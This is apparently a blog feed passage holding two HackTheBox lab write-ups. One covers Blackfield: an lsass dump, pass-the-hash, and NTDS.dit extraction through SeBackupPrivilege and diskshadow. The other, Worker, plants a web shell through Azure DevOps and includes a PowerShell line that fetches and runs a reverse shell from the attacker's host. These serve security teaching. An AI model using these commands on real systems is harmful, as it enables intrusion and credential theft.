$ smbclient -U <span style="color:#e6db74">&#39;audit2020%P@$$w0rd!&#39;</span>//10.10.10.192/forensic 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:03:16 <span style="color:#ae81ff">2020</span>
  commands_output                     D        <span style="color:#ae81ff">0</span>  Mon Feb <span style="color:#ae81ff">24</span> 01:14:37 <span style="color:#ae81ff">2020</span>
  memory_analysis                     D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">29</span> 03:28:33 <span style="color:#ae81ff">2020</span>
  tools                               D        <span style="color:#ae81ff">0</span>  Sun Feb <span style="color:#ae81ff">23</span> 20:39:08 <span style="color:#ae81ff">2020</span>
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> mget *
</code></pre></div><p>Enumerating on the memory_analysis folder, there is a file called <code>lsass.zip</code> that contains <code>lsass.DMP</code> which is interesting to me.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, <span style="color:#ae81ff">16</span> streams, Sun Feb <span style="color:#ae81ff">23</span> 18:02:01 2020, 0x421826 type
</code></pre></div><blockquote>
<p>LSASS (Local Security Authentication Subsystem Service) is a service/process that used to verify and authenticate users on login to a Windows computer. In other words, it holds the Windows credentials.</p>
</blockquote>
<p>I can use a tool called <code>pypykatz</code> to dump the contents of <code>lsass.DMP</code>. The NT hash of <code>svc-backup</code> immediately shows up on the top.</p>
<p><img class="img-container" src="imgs/image-20210504173356195.png" alt="image-20210504173356195"  />
</p>
<p><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-svc_backup">Shell as svc_backup</h3>
<h4 id="remote-access">Remote Access</h4>
<p>I already know that this user can login remotely (from <a href="#ldap-domain-dump">LDAP</a>), so I can try it with <code>evil-winrm</code>, and it works.</p>
<pre><code>→ root@iamf «blackfield» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
</code></pre><p><img class="img-container" src="imgs/image-20210504173749952.png" alt="image-20210504173749952"  />
</p>
<p>User flag is done here.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Also from <a href="#ldap-domain-dump">LDAP</a>, <code>svc-backup</code> is a member of the Backup Operators group. Each member of the Backup Operators group can perform backup and restore operations. The privilege name to perform those two operations are called <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>.</p>
<p><img class="img-container" src="imgs/image-20210504174334134.png" alt="image-20210504174334134"  />
</p>
<p>Those two privileges can be abused<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup> using <code>diskshadow</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.</p>
<p>I can&rsquo;t just perform the backup and restore if the system is currently in use. But, there is a technology from Microsoft called &ldquo;Shadow Copy&rdquo; that makes this possible, and that&rsquo;s where <code>diskshadow</code> will be used.</p>
<p>So the idea is that I can create a volume shadow of <code>C:\</code> drive and backup the <code>NTDS.dit</code> file (AD database) from the volume shadow back to <code>C:\</code> drive. After that I can grab the <code>ntds.dit</code> and dump the NT hashes from <code>NTDS.dit</code> locally using <code>secretsdump.py</code>.</p>
<h4 id="abusing-sebackupprivilege">Abusing SeBackupPrivilege</h4>
<p>To abuse this privilege, I&rsquo;ll use <a href="https://gist.githubusercontent.com/bohops/d34d9cf7793ba5f98009bc4ab2acd8f9/raw/38706044fb62790db16b0af21b7028a59591c05f/diskshadow.txt">this gist</a> as reference, and I&rsquo;ll need <a href="https://github.com/giuliano108/SeBackupPrivilege">this module</a>.</p>
<p>Then, I&rsquo;ll create a few scripts to perform all the needed actions (create a volume, grab <code>ntds.dit</code>, and cleanup the volume shadow) in one shot.</p>
<p>First, the script for grabbing <code>ntds.dit</code>, I&rsquo;ll save it as <code>copy.cmd</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
</code></pre></div><p>Second, the script for creating and deleting the volume shadow, I&rsquo;ll save it as <code>script.txt</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">set context persistent nowriters 
add volume c: alias iamf 
create 
expose %iamf% f: 
exec &#34;copy.cmd&#34; 
delete shadows volume %iamf% 
reset
</code></pre></div><p>I&rsquo;ll move the modules and the scripts to a folder called <code>exploits</code>.</p>
<pre><code>→ root@iamf «exploits» «10.10.14.169»
$ tree
.
├── SeBackupPrivilegeCmdLets.dll
├── SeBackupPrivilegeUtils.dll
├── copy.cmd
└── script.txt

0 directories, 4 files
</code></pre><p>Now, I’ll copy these <code>.dll</code> modules, <code>copy.cmd</code>, and <code>script.txt</code> to Blackfield using upload feature from <code>evil-winrm</code> at <code>C:\temp\</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u svc_backup -H <span style="color:#e6db74">&#39;9658d1d1dcd9250115e2205d9f48400d&#39;</span>
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>ocuments&gt;mkdir C:<span style="color:#ae81ff">\t</span>emp; cd C:<span style="color:#ae81ff">\t</span>emp
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload copy.cmd
...&lt;SNIP&gt;...
*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>emp&gt; upload script.txt
...&lt;SNIP&gt;...
</code></pre></div><p>After that, I can run <code>diskshadow</code> with the <code>/s</code> option and specify <code>script.txt</code> as the command sequence.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; diskshadow /s script.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/4/2020 8:15:53 AM

-&gt; set context persistent nowriters
-&gt; add volume c: alias iamf
-&gt; create

Alias iamf for shadow ID {7c53326a-2617-450c-9d2d-5c381352aa45} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {6142125a-a889-46a9-9d5e-87ff17b66d2c}

        * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45}               %iamf%
                - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/4/2020 8:15:54 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-&gt; expose %iamf% f:
-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
The shadow copy was successfully exposed as f:\.
-&gt; exec &#34;copy.cmd&#34;
C:\temp&gt;cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
Copied 18874368 bytes
-&gt; delete shadows volume %iamf%
-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\?\Volume{351b4712-0000-0000-0000-602200000000}\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]...

Number of shadow copies deleted: 1
-&gt; reset
</code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.
</code></pre></div><p>I&rsquo;ll download these files to my Kali using <code>evil-winrm</code> download feature.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; ls


    Directory: C:\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/4/2020   8:20 AM       18874368 ntds.dit 
-a----        10/4/2020   8:14 AM            222 copy.cmd
-a----        10/4/2020   8:15 AM            140 script.txt
-a----        10/4/2020   8:14 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----        10/4/2020   8:14 AM          16384 SeBackupPrivilegeUtils.dll
-a----        10/4/2020   8:21 AM       17547264 system
</code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
<p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ secretsdump.py -system system -ntds ntds.dit LOCAL
Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
...&lt;SNIP&gt;...
</code></pre></div><h4 id="remote-access-1">Remote Access</h4>
<p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ evil-winrm -i 10.10.10.192 -u administrator -H <span style="color:#e6db74">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210504210042888.png" alt="image-20210504210042888"  />
</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>It&rsquo;s an anonymous authentication, but limited only to the rootDSE. In the domain controller (DC) side, it needs to know who are we and what authentication do we support, so it sends us the same thing it asked which exposes&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p><a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Worker</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
      <description>Learn how Azure Pipelines can be exploited</description>
      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SVN enumeration</li>
<li>Windows enumeration</li>
<li>Exploiting Azure Pipelines</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>svn cli client - Preinstalled in Kali Linux</li>
<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
Nmap scan report <span style="color:#66d9ef">for</span> dimension.worker.htb <span style="color:#f92672">(</span>10.10.10.203<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
3690/tcp open  svnserve Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ nmap -p53,445,389,5985 10.10.10.203
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-31 13:34 EST
Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.

PORT     STATE     SERVICE
<span style="color:#ae81ff">53</span>       filtered  domain
<span style="color:#ae81ff">389</span>      filtered  ldap
<span style="color:#ae81ff">445</span>      filtered  microsoft-ds
<span style="color:#ae81ff">5985</span>     open      wsman
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the port 80 displays the IIS default page.</p>
<p><img class="img-container" src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  />
</p>
<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
<p>The general usage as follows:</p>
<pre><code>svn &lt;sub-command&gt; svn://[ip]
</code></pre><ul>
<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
</ul>
<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn cat svn://10.10.10.203/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :<span style="color:#f92672">)</span>
</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn info svn://10.10.10.203
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: <span style="color:#ae81ff">5</span>
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: <span style="color:#ae81ff">5</span>
Last Changed Date: 2020-06-20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span>
</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn log svn://10.10.10.203
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r5 | nathen | 2020–06–20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added note that repo has been migrated
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r4 | nathen | 2020–06–20 09:50:20 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Moving this repo to our new devops server which will handle the deployment <span style="color:#66d9ef">for</span> us
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r3 | nathen | 2020–06–20 09:46:19 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r2 | nathen | 2020–06–20 09:45:16 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
Added deployment script
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r1 | nathen | 2020–06–20 09:43:43 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
First version
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><img class="img-container" src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  />
</p>
<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
<ul>
<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
<li>A set of credentials: <code>nathen:wendel98</code></li>
</ul>
<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
<p><img class="img-container" src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  />
</p>
<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
<p><img class="img-container" src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  />
</p>
<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
<ul>
<li><code>alpha.worker.htb</code></li>
<li><code>cartoon.worker.htb</code></li>
<li><code>lens.worker.htb</code></li>
<li><code>solid-state.worker.htb</code></li>
<li><code>spectral.worker.htb</code></li>
<li><code>story.worker.htb</code></li>
</ul>
<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
<h4 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h4>
<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  />
</p>
<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
<p><img class="img-container" src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  />
</p>
<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
<p><img class="img-container" src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  />
</p>
<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
<p><img class="img-container" src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  />
</p>
<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
<p><img class="img-container" src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  />
</p>
<p>From there, I try to lookup into the project&rsquo;s repository.</p>
<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
<p><img class="img-container" src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  />
</p>
<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
<blockquote>
<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
</blockquote>
<p><img class="img-container" src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  />
</p>
<p>User <code>nathen</code> is allowed to queue a builds.</p>
<p><img class="img-container" src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  />
</p>
<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
<h4 id="webshell-upload">Webshell Upload</h4>
<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
<p><img class="img-container" src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  />
</p>
<p>I&rsquo;ll pick any available work items.</p>
<p><img class="img-container" src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  />
</p>
<p>I can just drag and drop the web shell, and commit it afterwards.</p>
<p><img class="img-container" src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  />
</p>
<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
<p><img class="img-container" src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  />
</p>
<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
<p><img class="img-container" src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  />
</p>
<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
<p><img class="img-container" src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  />
</p>
<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe <span style="color:#e6db74">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p>
<p><img class="img-container" src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-robisl">Shell as robisl</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
<p><img class="img-container" src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  />
</p>
<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
<p><img class="img-container" src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  />
</p>
<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
<pre><code>PS C:\users\&gt;net share

Share name   Resource                        Remark

